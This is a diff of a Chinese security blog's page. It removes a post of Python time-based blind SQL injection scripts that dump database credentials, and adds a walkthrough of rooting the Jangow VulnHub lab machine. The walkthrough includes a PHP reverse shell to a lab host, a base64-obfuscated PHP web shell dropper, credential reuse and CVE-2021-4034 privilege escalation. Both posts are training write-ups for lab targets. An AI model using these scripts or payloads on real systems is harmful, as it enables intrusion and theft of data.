@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/05/18/SQL%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E2%80%94%E2%80%94%E4%BA%8C%E5%88%86%E6%B3%95/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/06/07/Jangow/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/05/18/SQL%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E2%80%94%E2%80%94%E4%BA%8C%E5%88%86%E6%B3%95/" class="post-title-link" itemprop="url">SQL时间盲注——二分法</a>
+          <a href="/2023/06/07/Jangow/" class="post-title-link" itemprop="url">Jangow</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-05-18 10:51:53" itemprop="dateCreated datePublished" datetime="2023-05-18T10:51:53+08:00">2023-05-18</time>
+      <time title="创建时间：2023-06-07 13:07:45" itemprop="dateCreated datePublished" datetime="2023-06-07T13:07:45+08:00">2023-06-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -247,12 +247,12 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全学习</span></a>
+          <a href="/categories/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
         </span>
     </span>
 
   
-    <span id="/2023/05/18/SQL%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E2%80%94%E2%80%94%E4%BA%8C%E5%88%86%E6%B3%95/" class="post-meta-item leancloud_visitors" data-flag-title="SQL时间盲注——二分法" title="阅读次数">
+    <span id="/2023/06/07/Jangow/" class="post-meta-item leancloud_visitors" data-flag-title="Jangow" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,14 +265,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>6k</span>
+      <span>1.2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>5 分钟</span>
+      <span>1 分钟</span>
     </span>
 </div>
 
@@ -283,276 +283,66 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>一、噢噢噢……时间盲注比盲注还废手，所以我还是用脚本吧。本来是上次就应该写好的，但是奈何自己犯傻了，用初始时间去减结束时间，然后的结果相信大家都知道了……</p>
-<h3 id="SQL时间盲注——GET注入"><a href="#SQL时间盲注——GET注入" class="headerlink" title="SQL时间盲注——GET注入"></a>SQL时间盲注——GET注入</h3><p>二、还是老样子，使用的是大佬的脚本进行改版的，反正自从看了大佬的脚本，也差不多会写了……直接上代码吧，反正相信大家都能看懂</p>
-<pre><code>import time
-import requests
-
-url = &quot;http://xxx.com/?id=1&quot;
-
-def getDatabase():  # 获取数据库名
-    # 将url变量变为一个全局变量
-    global url
-    ans = &quot;&quot;
-    for i in range(1, 1000):
-        low = 32
-        high = 128
-        mid = (low + high) // 2
-        while low &lt; high:
-            payload = url + &quot;&#39; and if(ascii(substr((select database()),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&quot;.format(i, mid)
-            # print(payload)  # 用于测试
-            start_time = time.time()
-            requests.get(payload)
-            end_time = time.time()
-            use_time = end_time - start_time
-            # 如果时间大于3，那么说明为真
-            if use_time &gt;= 3:
-                high = mid
-            else:
-                low = mid + 1
-            mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;database is -&gt; &quot; + ans)
-
-def getTable():  # 获取表名
-    global url
-    ans = &quot;&quot;
-    for i in range(1, 1000):
-        low = 32
-        high = 128
-        mid = (low + high) // 2
-        while low &lt; high:
-            payload = url + &quot;&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&quot;.format(
-                i, mid)
-            # print(payload)用于测试
-            start_time = time.time()
-            requests.get(payload)
-            end_time = time.time()
-            use_time = end_time - start_time
-            # 如果时间大于3，那么说明为真
-            if use_time &gt;= 3:
-                high = mid
-            else:
-                low = mid + 1
-            mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;table is -&gt; &quot; + ans)
-    # 返回表名，此时表名为一个列表
-    return ans
-
-def getColumn(TBname):  # 获取列名
-    global url
-    ans = &#39;&#39;
-    for i in range(1, 1000):
-        low = 32
-        high = 128
-        mid = (low + high) // 2
-        while low &lt; high:
-            payload = url + &quot;&#39; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;&#123;0&#125;&#39;),&#123;1&#125;,1))&lt;&#123;2&#125;,sleep(3),1) -- p&quot;.format(
-                TBname, i, mid)
-            print(payload)  # 用于测试
-            start_time = time.time()
-            requests.get(payload)
-            end_time = time.time()
-            use_time = end_time - start_time
-            # 如果时间大于3，那么说明为真
-            if use_time &gt;= 3:
-                high = mid
-            else:
-                low = mid + 1
-            mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;column is -&gt; &quot; + ans)
-    # 返回一个列名
-    return ans
-    
-def dumpTable():  # 脱裤
-    global url
-    ans = &#39;&#39;
-    for i in range(1, 1000):
-        low = 32
-        high = 128
-        mid = (low + high) // 2
-        while low &lt; high:
-            payload = url + &quot;&#39; and if(ascii(substr((select group_concat(username,password) from wfy_admin),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&quot;.format(
-                i, mid)
-            print(payload)  # 用于测试
-            start_time = time.time()
-            requests.get(payload)
-            end_time = time.time()
-            use_time = end_time - start_time
-            # 如果时间大于3，那么说明为真
-            if use_time &gt;= 3:
-                high = mid
-            else:
-                low = mid + 1
-            mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;dumpTable is -&gt; &quot; + ans)
-
-if __name__ == &quot;__main__&quot;:
-    # # getDatabase()
-    # TBname = getTable()
-    # # print(type(TBname))表示是一个字符串，用来测试
-    # TBnames = []
-    # TBnames.append(TBname.split(&#39;,&#39;))
-    # # 因为输出的是一个二元数组，所以使用下面的代码来转为一维数组
-    # TBnames = TBnames[0]
-    # print(TBnames)
-    # TBlen = len(TBnames)
-    # for i in range(0, TBlen):
-    #     TBname = TBnames[i]
-    #     # print(TBname)
-    #     getColumn(TBname)
-    #     if i == TBlen - 1:
-    #         break
-    dumpTable()
-</code></pre>
-<p>运行结果就不放了。</p>
-<h3 id="SQL时间盲注——POST注入"><a href="#SQL时间盲注——POST注入" class="headerlink" title="SQL时间盲注——POST注入"></a>SQL时间盲注——POST注入</h3><pre><code>import requests
-import time
-
-url = &quot;http://192.168.59.150/sqli-labs/Less-15/&quot;
-
-def getDatabase():  # 获取数据库名
-    # 将url变量变为一个全局变量
-    global url
-    ans = &#39;&#39;
-    for i in range(1, 1000):
-        low = 32
-        high = 128
-        mid = (low + high) // 2
-        while low &lt; high:
-            payload = &quot;admin&#39; and if(ascii(substr((select database()),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&quot;.format(i, mid)
-            # print(payload)用于测试
-            data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;
-            start_time = time.time()
-            requests.post(url, data)
-            end_time = time.time()
-            use_time = end_time - start_time
-            # 如果时间大于3，那么说明为真
-            if use_time &gt;= 3:
-                high = mid
-            else:
-                low = mid + 1
-            mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;database is -&gt; &quot; + ans)
-       
-def getTable():  # 获取表名
-    global url
-    ans = &quot;&quot;
-    for i in range(1, 1000):
-        low = 32
-        high = 128
-        mid = (low + high) // 2
-        while low &lt; high:
-            payload = &#39;admin\&#39; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&#39;.format(
-                i, mid)
-            # print(payload)用于测试
-            data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;
-            start_time = time.time()
-            requests.post(url, data)
-            end_time = time.time()
-            use_time = end_time - start_time
-            # 如果时间大于3，那么说明为真
-            if use_time &gt;= 3:
-                high = mid
-            else:
-                low = mid + 1
-            mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;table is -&gt; &quot; + ans)
-    # 返回表名，此时表名为一个列表
-    return ans
-    
-def getColumn(TBname):  # 获取列名
-    global url
-    ans = &#39;&#39;
-    for i in range(1, 1000):
-        low = 32
-        high = 128
-        mid = (low + high) // 2
-        while low &lt; high:
-            payload = &quot;admin&#39; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;&#123;0&#125;&#39;),&#123;1&#125;,1))&lt;&#123;2&#125;,sleep(3),1) -- p&quot;.format(
-                TBname, i, mid)
-            # print(payload)用于测试
-            data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;
-            start_time = time.time()
-            requests.post(url, data)
-            end_time = time.time()
-            use_time = end_time - start_time
-            # 如果时间大于3，那么说明为真
-            if use_time &gt;= 3:
-                high = mid
-            else:
-                low = mid + 1
-            mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;column is -&gt; &quot; + ans)
-    # 返回一个列名
-    return ans
-    
-def dumpTable():  # 脱裤
-    global url
-    ans = &#39;&#39;
-    for i in range(1, 1000):
-        low = 32
-        high = 128
-        mid = (low + high) // 2
-        while low &lt; high:
-            payload = &quot;admin&#39; and if(ascii(substr((select group_concat(username,password) from users),&#123;0&#125;,1))&lt;&#123;1&#125;,sleep(3),1) -- p&quot;.format(
-                i, mid)
-            # print(payload)# 用于测试
-            data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;
-            start_time = time.time()
-            requests.post(url, data)
-            end_time = time.time()
-            use_time = end_time - start_time
-            # 如果时间大于3，那么说明为真
-            if use_time &gt;= 3:
-                high = mid
-            else:
-                low = mid + 1
-            mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;dumpTable is -&gt; &quot; + ans)
-        
-if __name__ == &quot;__main__&quot;:
-    # # getDatabase()
-    # TBname = getTable()
-    # # print(type(TBname))表示是一个字符串，用来测试
-    # TBnames = []
-    # TBnames.append(TBname.split(&#39;,&#39;))
-    # # 因为输出的是一个二元数组，所以使用下面的代码来转为一维数组
-    # TBnames = TBnames[0]
-    # # print(TBnames)
-    # TBlen = len(TBnames)
-    # for i in range(0,TBlen):
-    #     TBname = TBnames[i]
-    #     # print(TBname)
-    #     getColumn(TBname)
-    #     if i == TBlen - 1:
-    #         break
-    dumpTable()
-</code></pre>
-<p>运行结果也不放了。</p>
+          <p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/jangow-101,754/">https://www.vulnhub.com/entry/jangow-101,754/</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先使用<code>sudo arp-scan -I eth0 -l</code>获取主机的IP地址</p>
+<p><img src="/images/Jangow/image-20230607132232018.png"></p>
+<p>然后使用<code>nmap -sC -sV -p- 10.0.2.6 -o result.txt</code>获取端口信息</p>
+<p>在此期间我们可以访问其网站看看有没有开启http服务</p>
+<p><img src="/images/Jangow/image-20230607132709898.png"></p>
+<p>扫描后台文件，使用<code>dirsearch -u &quot;http://10.0.2.6/site/&quot;</code>，并没有发现什么有用的信息</p>
+<p><img src="/images/Jangow/image-20230607132926107.png"></p>
+<p>点击<code>buscar</code>发现有一个空白页面，还有一个参数可以进行传递</p>
+<p><img src="/images/Jangow/image-20230607133041784.png"></p>
+<p>经过payload的fuzz，发现存在命令执行</p>
+<p><img src="/images/Jangow/image-20230607133837197.png"></p>
+<p>nmap扫出来发现开放的端口只有21和80，然后尝试匿名FTP登录，发现失败了</p>
+<p><img src="/images/Jangow/image-20230607133952786.png"></p>
+<p><img src="/images/Jangow/image-20230607134046855.png"></p>
+<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><p>我们可以使用命令执行来通过PHP反弹shell</p>
+<blockquote>
+<p>php -r ‘$sock&#x3D;fsockopen(“10.0.2.15”,7777);exec(“&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
+</blockquote>
+<p><img src="/images/Jangow/image-20230607134321551.png"></p>
+<p>然后发现一直转，但是就是没有获取到shell，这里可能是对外不出网的，使用<code>curl</code>或者<code>wegt</code>验证一下，可以先使用whereis查看一下是否有wget</p>
+<p><img src="/images/Jangow/image-20230607134510174.png"></p>
+<p><img src="/images/Jangow/image-20230607134550603.png"></p>
+<p>证明不出网，这里就要使用木马了，然后使用哥斯拉的不出网反弹shell功能获取shell。</p>
+<p>先写入一句话木马</p>
+<blockquote>
+<p>echo ZWNobyAnPD9waHAgQGV2YWwoJF9QT1NUWzhdKTsgPz4nID4gc2hlbGwucGhw | base64 -d | sh</p>
+</blockquote>
+<p><img src="/images/Jangow/image-20230607134751504.png"></p>
+<p>使用哥斯拉进行连接</p>
+<p><img src="/images/Jangow/image-20230607134918941.png"></p>
+<p>然后点击start，在本地使用<code>rlwrap -cAr nc 127.0.0.1 4444</code>获取shell</p>
+<p><img src="/images/Jangow/image-20230607135029528.png"></p>
+<p>然后使用<code>bash -i</code>获取更高级的shell，但是这个shell还是不够使用，使用whereis发现存在python的环境，所有我们可以使用下面的命令获取交互式shell</p>
+<p><img src="/images/Jangow/image-20230607135859922.png"></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>在html目录下发现<code>.backup</code>文件，然后使用cat命令查看发现是一个数据库的账号密码</p>
+<p><img src="/images/Jangow/image-20230607140023235.png"></p>
+<p>因为我们之前是发现了有ftp服务的，所以我们尝试使用这个账号密码是否可以进行登录</p>
+<p><img src="/images/Jangow/image-20230607140159950.png"></p>
+<p>无法进入root目录，所以权限还是不高的，还是要进行其他的操作</p>
+<p><img src="/images/Jangow/image-20230607140253112.png"></p>
+<p>使用<code>netstat -anlt</code>发现有22端口开放，应该是只对内部网络开放的（因为之前端口扫描并没有获取到端口信息）</p>
+<p><img src="/images/Jangow/image-20230607140430275.png"></p>
+<p>使用之前的账号密码也是可以进行登录的</p>
+<p><img src="/images/Jangow/image-20230607140531824.png"></p>
+<p>在该目录中获取第一个flag</p>
+<p><img src="/images/Jangow/image-20230607140638576.png"></p>
+<p>但是权限不高…………使用<code>uname -a</code>查看系统信息</p>
+<p><img src="/images/Jangow/image-20230607140652421.png"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>经过查找资料，发现这个版本是存在一个CVE漏洞的（CVE-2021-4034），通过查看发现确实可以利用</p>
+<p><img src="/images/Jangow/image-20230607140830903.png"></p>
+<p>然后我们使用ftp上传exp，使用put命令</p>
+<p><img src="/images/Jangow/image-20230607140948083.png"></p>
+<p>使用<code>gcc cve-2021-4034-poc.c -o exp</code>获取可执行文件，运行之后可以获取到root权限</p>
+<p><img src="/images/Jangow/image-20230607141129344.png"></p>
+<p><img src="/images/Jangow/image-20230607141156912.png"></p>
+<p>还可以使用脏牛进行提权</p>
+<p><img src="/images/Jangow/image-20230607141338711.png"></p>
+<p><img src="/images/Jangow/image-20230607141420574.png"></p>
+<p>也是可以获取root权限的</p>
 
       
     </div>
@@ -572,7 +362,7 @@ if __name__ == &quot;__main__&quot;:
 
 
   <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/18/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span><a class="page-number" href="/page/20/">20</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/20/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/18/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span><a class="page-number" href="/page/20/">20</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/20/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 </div>
@@ -596,7 +386,7 @@ if __name__ == &quot;__main__&quot;:
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">180k</span>
+    <span title="站点总字数">181k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
